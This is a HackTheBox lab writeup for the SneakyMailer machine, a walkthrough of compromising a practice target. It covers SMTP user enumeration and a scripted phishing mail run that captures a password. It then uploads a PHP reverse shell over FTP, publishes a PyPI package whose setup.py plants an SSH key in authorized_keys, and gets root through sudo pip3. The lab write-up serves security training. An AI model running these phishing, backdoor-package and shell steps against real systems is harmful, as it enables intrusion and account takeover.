---
title: "SneakyMailer  HackTheBox Writeup"
last_modified_at: 2020-10-17T14:40:02-05:00
categories:
  - htb
author_profile: false
tags:
  - HTB
  - Linux
  - sneakymailer
  - gtfobins
  - phishing attack
  - smtp user enumeration
  - pspy
  - custom python package
  - PyPI
---
<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

![image](/assets/images/htb-boxes/sneaky.png)

## Summary:

*   Enumerating web server on port 80 to get a bunch of email addresses
*   Verifying valid emails using smtp-user-enum
*   Sending mail to all employees with IP address controlled by the attacker and getting a response
*   Logging on a mail client to read victim emails
*   Logging on the FTP server and uploading PHP reverse shell
*   Uploading custom python package to PyPI server with payload in setup.py
*   Getting root shell as the user low on the box can run pip3 as sudo

# PortScan

## All Ports
```console
local@local:~/Documents/htb/boxes/sneakymailer$  nmap -p- -oN nmap/allports --max-retries 0 10.10.10.197
Nmap scan report for sneakycorp.htb (10.10.10.197)
Host is up (0.18s latency).                                                             
Not shown: 41746 closed ports, 23782 filtered ports
PORT     STATE SERVICE                                                                  
21/tcp   open  ftp                                                                      
22/tcp   open  ssh                                                                      
25/tcp   open  smtp                  
80/tcp   open  http                                                                                                                                                             
143/tcp  open  imap                 
993/tcp  open  imaps              
8080/tcp open  http-proxy                                                               
                                                                                        
# Nmap done at Thu Jul 16 18:19:53 2020 -- 1 IP address (1 host up) scanned in 54.07 seconds
```
## Detail Port Scan
```console
local@local:~/Documents/htb/boxes/sneakymailer$ nmap -sC -sV -oN nmap/sneaky 10.10.10.197
Nmap scan report for 10.10.10.197
Host is up (0.17s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: UTF8=ACCEPTA0001 QUOTA ENABLE STARTTLS SORT UIDPLUS NAMESPACE OK ACL ACL2=UNION IMAP4rev1 THREAD=ORDEREDSUBJECT CHILDREN completed IDLE CAPABILITY THREAD=REFERENCES
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: UTF8=ACCEPTA0001 QUOTA ENABLE SORT UIDPLUS NAMESPACE OK ACL ACL2=UNION IMAP4rev1 THREAD=ORDEREDSUBJECT completed CHILDREN CAPABILITY IDLE THREAD=REFERENCES AUTH=PLAIN
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 16 18:15:24 2020 -- 1 IP address (1 host up) scanned in 77.66 seconds
```
Looking at the results we have quite a few ports open. So, lets start the enumeration with the HTTP service on port 80.

Port 80
-------

![1](/assets/images/sneakymailer/1.png)

While going to [http://10.10.10.197](http://10.10.10.197) it redirects us to sneakycorp.htb and the site can’t be reached. So let’s add the entry to our /etc/hosts file.

```console
10.10.10.197    sneakycorp.htb
```

And now when you reload the page, we can browse the homepage.

![2](/assets/images/sneakymailer/2.png)


From this page, we can get information that SMTP and POP3 service is installed completely but the PyPI service is still not completed.

Looking at [http://sneakycorp.htb/team.php](http://sneakycorp.htb/team.php) we get a list of the employees with their Name, Position, and Email address. Names can be used to create a list of potential usernames later if needed and ports like SMTP and IMAP are open in the box means we might be needing email addresses. So I copied all the information to my local machine.

![3](/assets/images/sneakymailer/3.png)

Gobuster
--------

```console
$ gobuster dir -u http://sneakycorp.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php  
/index.php (Status: 200)  
/img (Status: 301)  
/css (Status: 301)  
/team.php (Status: 200)  
/js (Status: 301)  
/vendor (Status: 301)  
/pypi (Status: 301)
```

Using gobuster we find a directory called pypi. And again running gobuster on that directory we found a file.

```console
$ gobuster dir -u http://sneakycorp.htb/pypi/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php  
/register.php (Status: 200)
```

And while visiting [http://sneakycorp.htb/pypi/register.php](http://sneakycorp.htb/pypi/register.php), we get a form for creating an account. So, I registered an account with mail test@test.com and password as password.

![4](/assets/images/sneakymailer/4.png)


![5](/assets/images/sneakymailer/5.png)


After registering there was no different response and no place to log in.

SMTP-Port 25
------------

Now that we have a bunch of email addresses, I thought that I should play with the SMTP server. As port 25 was open, we could verify the valid email addresses using VRFY command.

Here, I will try to show three possible cases.

1.  The first email was from the team.php site. ie **airisatou@sneakymailer.htb** which turns out to be a valid email as we get 252 response from the server. You can check out the server return codes in [here](https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes).

```console
VRFY <airisatou@sneakymailer.htb>  
252 2.0.0 <airisatou@sneakymailer.htb>
```

2\. Invalid email address. ie **thisemaildoesnotexists@email.com**

```console
VRFY <thisemaildoesnotexists@email.com>  
454 4.7.1 <thisemaildoesnotexists@email.com>: Relay access denied
```

It says relay access denied means that the SMTP server is not configured to send the mail to the external mail server.

3\. Invalid email address. ie **thisemaildoesnotexist@sneakymailer.htb**

```console
VRFY <thisemaildoesnotexist@sneakymailer.htb>  
550 5.1.1 <thisemaildoesnotexist@sneakymailer.htb>: Recipient address rejected: User unknown in virtual mailbox table
```

This time the response is 550 which is email address is not valid.

Using this technique now we can enumerate the list of valid emails on the box. But we do have a bunch of email addresses and doing this manually will consume a lot of time. But luckily we have a tool called smtp-user-enum built-in Kali Linux. You can read about smtp-user-enum and how it enumerates the valid email addresses in [here](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum).

Using smtp-user-enum
--------------------

```console
$ smtp-user-enum -U email.txt 10.10.10.197 25                                                                                    [19/19]  
Connecting to 10.10.10.197 25 ...                                                         
220 debian ESMTP Postfix (Debian/GNU)                                                     
250 debian                                                                                
Start enumerating users with VRFY mode ...                                                
[----] <airisatou@sneakymailer.htb>          252 2.0.0 <airisatou@sneakymailer.htb>   
[----] <angelicaramos@sneakymailer.htb>      252 2.0.0 <angelicaramos@sneakymailer.htb>  
[----] <ashtoncox@sneakymailer.htb>          252 2.0.0 <ashtoncox@sneakymailer.htb>     
[----] <bradleygreer@sneakymailer.htb>       252 2.0.0 <bradleygreer@sneakymailer.htb>    
[----] <brendenwagner@sneakymailer.htb>      252 2.0.0 <brendenwagner@sneakymailer.htb>   
[----] <briellewilliamson@sneakymailer.htb>  252 2.0.0 
```

It turns out all the emails were valid email addresses as we get a response of 252.

At this point, I only had few valid email addresses but no passwords and I did not have any clue what I should do next. As the smtp service was open, I thought of sending email to the users and tricking them to click on the link that we sent.


Sending Email using SMTP protocol
---------------------------------

```console
$ nc 10.10.10.197 25  
220 debian ESMTP Postfix (Debian/GNU)   #hello message  
MAIL FROM:<this_email_doesnot_exist@email.com> #non valid email  
250 2.1.0 Ok  
RCPT TO:<airisatou@sneakymailer.htb>        #valid email  
250 2.1.5 Ok  
DATA  
354 End data with <CR><LF>.<CR><LF>  
http://10.10.14.167/clickme             #email content with my ip  
.  
250 2.0.0 Ok: queued as DE8202466A
```

This is the standard protocol for sending emails using SMTP. If you find this confusing, you could read about SMTP protocols [here](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol). And one more thing, we can also enumerate valid email addresses using RCTP TO: while sending the mail.

Instead of doing it manually, let us write a script that sends mail from each valid address to other email addresses.

```bash
#!/bin/bash  
for sender in $(cat email)  #email contains lists of emails  
do  
        for rcv in $(cat email)  
        do echo "mail from:$sender"  
                echo "rcpt to:$rcv"  
                echo "data"  
                echo "Subject: Looking for a job"   
                echo "http://10.10.14.167/clickme" #attackers ip  
                echo "."  
        done  
done
```

**Sending Mail**

```console
$ ./sendmail.sh | nc 10.10.10.197 25
```

**Listening on the box using Netcat**

```console
$ sudo nc -nvklp 80
```

\-k flag is used because after the connection is made once, Netcat keeps listening on port 80.

And after some time we get a hit.

```html
POST /clickme%0D HTTP/1.1  
Host: 10.10.14.167  
User-Agent: python-requests/2.23.0  
Accept-Encoding: gzip, deflate  
Accept: */*  
Connection: keep-alive  
Content-Length: 185  
Content-Type: application/x-www-form-urlencodedfirstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcH  
l%3C%3AHt
```

We did not get a reply from other users except Paul.

After URL decoding, we get email and password as:
```
*   Email: paulbyrd@sneakymailer.htb
*   Password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```
Now that we have a password for a user, let's try to log in on the services in the box.

FTP
---

```console
$ ftp 10.10.10.197  
Connected to 10.10.10.197.  
220 (vsFTPd 3.0.3)  
Name (10.10.10.197:root): paulbyrd  
530 Permission denied.  
Login failed.  
ftp>
```

It says permission denied and doesn't even ask for a password. This happens because parameter userlist\_enable  in file _/etc/vsftpd/vsftpd.conf_ is set to YES and the parameter userlist\_deny default value is also set to YES.

So we have to come back to FTP with a username that is not on the list.

Now, we don't have that much options left but to try to read the emails of Paul.

IMAP (PORT 143)
---------------

```console
$ nc 10.10.10.197 143  
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.  
A1 AUTHENTICATE LOGIN                   #initiating authentication  
+ VXNlcm5hbWU6                          #asking for email  
cGF1bGJ5cmRAc25lYWt5bWFpbGVyLmh0Ygo=    #email in b64 form  
+ UGFzc3dvcmQ6                          # asking for password  
XigjSkBTa0Z2MlslS2hJeEtrKEp1YGhxY0hsPDpIdAo=   #password in b64 form  
A1 NO Login failed.
```

But for some reason, I could not log on IMAP in port 143.

So I installed an email client called Claws Mail which can be installed using

```console
apt install claws-mail
```

Configuration for claws-mail

![6](/assets/images/sneakymailer/6.png)


On the sent items, I found two emails.

```console
From: Paul Byrd <paulbyrd@sneakymailer.htb>  
To: low@debian  
Subject: Module testing  
Date: Wed, 27 May 2020 13:28:58 -0400  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101  
 Thunderbird/68.8.0Hello lowYour current task is to install, test and then erase every python module you   
find in our PyPI service, let me know if you have any inconvenience.
```

From the first email, we can find out that there is a user low on the box. And he is supposed to install, test, and erase every python module on their PyPi service.

```console
From: Paul Byrd <paulbyrd@sneakymailer.htb>  
To: root <root@debian>  
Subject: Password reset  
Date: Fri, 15 May 2020 13:03:37 -0500Hello administrator, I want to change this password for the developer accountUsername: developer  
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CPlease notify me when you do it
```

From the second email, we get a username and a password. Let's try this on the FTP server.

FTP
---

```console
$ ftp 10.10.10.197  
Connected to 10.10.10.197.  
220 (vsFTPd 3.0.3)  
Name (10.10.10.197:root): developer  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp>
```

This time we are prompted for a password and we successfully log in with developer as user.

Looking around there was a directory called dev.

```console
ftp> dir -a  
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
drwxr-xr-x    3 0        0            4096 Jun 23 08:15 .  
drwxr-xr-x    3 0        0            4096 Jun 23 08:15 ..  
drwxrwxr-x    8 0        1001         4096 Aug 12 06:17 dev  
226 Directory send OK.  
ftp>
```

Inside dev folder

```console
ftp> cd dev  
250 Directory successfully changed.  
ftp> dir -a  
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
drwxrwxr-x    8 0        1001         4096 Aug 12 06:17 .  
drwxr-xr-x    3 0        0            4096 Jun 23 08:15 ..  
drwxr-xr-x    2 0        0            4096 May 26 19:52 css  
drwxr-xr-x    2 0        0            4096 May 26 19:52 img  
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php  
drwxr-xr-x    3 0        0            4096 May 26 19:52 js  
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi  
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss  
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php  
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor  
226 Directory send OK.
```

Looks like these are the files of the web server and we have write privilege on this folder, so I tried to upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell).

```console
ftp> put shell.php  
local: shell.php remote: shell.php  
200 PORT command successful. Consider using PASV.  
150 Ok to send data.  
226 Transfer complete.  
5494 bytes sent in 0.00 secs (20.7094 MB/s)  
ftp>
```

And while I tried to access the file on the server, I got a 404 error.

![1](/assets/images/sneakymailer/7.png)


It means there might be another web server running. So I ran gobuster for potential vhosts.

GOBUSTER
--------

```console
$ gobuster vhost -u sneakycorp.htb -w /usr/share/wordlists/SecLists-master/Discovery/DNS/namelist.txt  
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
```

Well, we could have guessed that by looking at the directory name on the FTP server. Let's add it to _/etc/hosts_ file.

```console
10.10.10.197    sneakycorp.htb dev.sneakycorp.htb
```

Uploading PHP reverse shell again and was accessed from the link [http://dev.sneakycorp.htb/shell.php](http://dev.sneakycorp.htb/shell.php) while listening on port 9001, we get a shell as www-data.

```console
$ nc -nvlp 9001  
Listening on [0.0.0.0] (family 2, port 9001)  
Listening on 0.0.0.0 9001  
Connection received on 10.10.10.197 48272  
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux  
 07:30:02 up  1:32,  0 users,  load average: 1.33, 1.15, 1.05  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
/bin/sh: 0: can't access tty; job control turned off  
$
```

Now let us upgrade our shell using python.

```console
$ python -c "import pty;pty.spawn('/bin/bash')"  
www-data@sneakymailer:/$
```

Background it with CTRL + Z

```console
$ stty raw -echo  
$ fg
```

And hit enter twice.

```console
www-data@sneakymailer:/$ export TERM=xterm
```

Now we have a proper tty shell with auto-completion and we can also clear the screen with CTRL+L.

PRIVILEGE ESCALATION
--------------------

Looking around on the box, inside _/var/www_

```console
www-data@sneakymailer:~$ ls -la /var/www  
total 24  
drwxr-xr-x  6 root root 4096 May 14 18:25 .  
drwxr-xr-x 12 root root 4096 May 14 13:09 ..  
drwxr-xr-x  3 root root 4096 Jun 23 08:15 dev.sneakycorp.htb  
drwxr-xr-x  2 root root 4096 May 14 13:12 html  
drwxr-xr-x  4 root root 4096 May 15 14:29 pypi.sneakycorp.htb  
drwxr-xr-x  8 root root 4096 Jun 23 09:48 sneakycorp.htb
```

There is another webserver pypi.sneakycorp.htb running. So, let us add this to our /etc/hosts file.

```console
10.10.10.197   sneakycorp.htb dev.sneakycorp.htb pypi.sneakycorp.htb
```

And looking at the open ports inside the box:

```console
$ ss -lt  
State   Recv-Q   Send-Q       Local Address:Port   Peer Address:Port     
LISTEN     0        5           127.0.0.1:5000        0.0.0.0:*
```

Port 5000 was open but not on all interfaces but and only can be accessed locally. And it turns out to be PyPI server that was accessible externally through a proxy using port 8080.

PORT 8080
---------

![1](/assets/images/sneakymailer/8.png)


And when we go to look for installed packages on http://pypi.sneakycorp.htb/packages , it asks for a username and password.

![1](/assets/images/sneakymailer/9.png)

Looking in pypi folder on the box, there was .htpasswd file with username pypi and a hash.

```console
www-data@sneakymailer:~/pypi.sneakycorp.htb$ ls -la  
total 20  
drwxr-xr-x 4 root root     4096 May 15 14:29 .  
drwxr-xr-x 6 root root     4096 May 14 18:25 ..  
-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd  
drwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packages  
drwxr-xr-x 6 root pypi     4096 May 14 18:25 venv  
www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd   
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

I copied the hash to my box and tried to crack with hashcat. To figure out which mode to use for the hash in hashcat check out the example hashes in [here](https://hashcat.net/wiki/doku.php?id=example_hashes).

```console
$ hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt  
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
```

And using the password, I logged in. But there were no packages.

![1](/assets/images/sneakymailer/10.png)


So I was out of options at this point. But after some digging, I realized that this is a PyPI server hosting python packages and what if I could upload my own python package. And after searching for a while, I found a [very good article](https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/) on creating custom packages and uploading on PyPI server. So I followed that article.

Creating a new package:

1.  Creating directories and files

```console
$ mkdir test     
$ cd test  
$ mkdir package$ touch setup.cfg; touch setup.py   
$ touch README.md; touch package/__init__.py
```

Contents For:

1.  setup.py

```python
from setuptools import setup
setup(
    name='package',
    packages=['package'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example']
    )
```

2\. setup.cfg

```
[metadata]  
description-file = README.md
```

3\. \_\_init\_\_.py

```python
def hello_word():  
    print("hello world")
```

4\. README.md was kept empty.

And to upload the package using setuptools, we need to create a .pypirc in our home directory.

```console
$ export HOME=`pwd`
$ touch ~/.pypirc
```

Contents of .pypirc

```console
$ cat ~/.pypirc 
[distutils]
index-servers =
  pypi
  linode
[pypi]
username:
password:
[linode]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

Now we are ready to upload our custom python package. But before uploading, let us copy pspy64 to the box and see what happens once we upload the package. Pspy is a command-line tool designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.

I opened an HTTP server in port 8000 on my box using python3.

```console
$ python3 -m http.server 8000  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And on the box, I used wget to download the file. I used chmod to make it executable and ran the file.

```console
www-data@sneakymailer:/dev/shm$ wget 10.10.14.167:8000/pspy64  
www-data@sneakymailer:/dev/shm$ chmod +x pspy64  
www-data@sneakymailer:/dev/shm$ ./pspy64
```

Uploading the package

```console
$ python setup.py sdist upload -r linode
```

Output from PSPY
----

```console
1. /bin/sh -c /usr/bin/tar -C /tmp/tmp19f4qjx_ -zxf /var/www/pypi.sneakycorp.htb/packages/package-0.1.tar.gz                          
2. /usr/bin/tar -C /tmp/tmp19f4qjx_ -zxf /var/www/pypi.sneakycorp.htb/packages/package-0.1.tar.gz                      
3. /home/low/venv/bin/python /opt/scripts/low/install-modules.py   
4. /bin/sh -c /usr/bin/screen -d -m /opt/scripts/low/install-module.sh /tmp/tmp19f4qjx_/package-0.1/setup.py &   
5. /usr/bin/screen -d -m /opt/scripts/low/install-module.sh /tmp/tmp19f4qjx_/package-0.1/setup.py   
6. /bin/bash /opt/scripts/low/install-module.sh /tmp/tmp19f4qjx_/package-0.1/setup.py   
7. /home/low/venv/bin/python /tmp/tmp19f4qjx_/package-0.1/setup.py install    
8. /home/low/venv/bin/python /opt/scripts/low/install-modules.py   
9. /home/low/venv/bin/python3 /home/low/venv/bin/pip uninstall package-0.1
```

From the output, we can see that the PyPI server is extracting the tar archive, installing the package by executing setup.py, and removing the package. It means we have code execution as setup.py gets executed.

Modifying setup.py to get a shell
---------------------------------

Looking at the _/home,_ there is a user called low having .ssh directory. So i tried to write my ssh public key to _/home/low/.ssh/authorized\_keys_

Let us create an ssh key pairs using ssh-keygen

```console
$ ssh-keygen   
Generating public/private rsa key pair.  
Enter file in which to save the key (/root/.ssh/id_rsa): sneakymailer  
Enter passphrase (empty for no passphrase):   
Enter same passphrase again:   
Your identification has been saved in sneakymailer.  
Your public key has been saved in sneakymailer.pub.  
The key fingerprint is:  
SHA256:NBsCstqBuzXuIYk5OpEEdiR2LjxNLoJn6ljxBUG2v8c root@kali  
The key's randomart image is:  
+---[RSA 3072]----+  
| oo=*.           |  
|=oB= +           |  
|*=B+. o +        |  
|.O++ o o +       |  
|=.= . . S        |  
|*B .   o         |  
|Ooo   . E        |  
|o+ .   .         |  
|...              |  
+----[SHA256]-----+
```

Updating setup.py

```python
from setuptools import setup
import os
try:
        os.system("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCtvax110OTMEuj4t0Jt1TiT8PaFeUAbDMj+o7Ju02JU7/04/MBpWUNh22snmlhL+JnGDkDmRVXJY5IZ7gNYzkE7lQKA2B2Koys5OyQ47okWr5/0ZeKqJROt8gUnKqKs0MeDMi1/29L7zy38nLMD7IB8ZxqbiO45359mGqqwKgGbcWx7nLnfpX8SNYS5h5+/uu1l+N6jsCk6qZt4bfk5U6N9S0SnSARSjC9077QqXHzEZFLjiJxYtK+p4goxAgGtaK91+RSpsdHO0WtPBAw/gL/F5eC+hU5Oz5e24/+dRDO3z4dnxBseTiCoj3Zfkz0Su11Q3hwQmS/T4AYPay0MnKkYy1vQ4vzFkj25LSmdOCQPGm04NsOmNc+ExxYpqI9LlgeOyle1IpXmeqnftXZvw/mSGkwcBY10P51ie33E05YRG/3TRla8HlfQjrj1puSctAGreBtSd9PO9VNql/FLViCzczJ+F4g9HFFc9QS50dCNo501hQLqcxLC1zt0MUEmk=' >> ~/.ssh/authorized_keys")
except:
        pass
setup(
    name='package',
    packages=['package'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example']
    )
```

Uploading the new package

```console
$ python setup.py sdist upload -r linode
```

And now we can ssh with the private key as user low on the box.

```console
$ ssh -i sneakymailer low@10.10.10.197  
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
No mail.  
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105  
low@sneakymailer:~$
```

And finally, we read the user flag.

```console
low@sneakymailer:~$ cat user.txt  | wc -c  
33
```

**PRIVILEGE ESCALATION TO ROOT**

I like to do a few manual enumerations before running scripts like [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) or [LinEnum](https://github.com/rebootuser/LinEnum).

And with sudo -l

```console
low@sneakymailer:~$ sudo -l  
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution  
Matching Defaults entries for low on sneakymailer:  
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binUser low may run the following commands on sneakymailer:  
    (root) NOPASSWD: /usr/bin/pip3
```

User low can run /usr/bin/pip3 as sudo. And after I saw this, I went to [gtfobins](https://gtfobins.github.io/gtfobins/pip/#sudo) if this can be used for privilege escalation, and turned out that we can.

![1](/assets/images/sneakymailer/11.png)


On the box, I ran the commands.

```console
low@sneakymailer:~$ TF=$(mktemp -d)  
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py  
low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF  
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution  
Processing /tmp/tmp.cA7sEWkFJt  
# id  
uid=0(root) gid=0(root) groups=0(root)
```

We are root.

```console
# cat /root/root.txt | wc -c  
33
```

And we can read the flag.
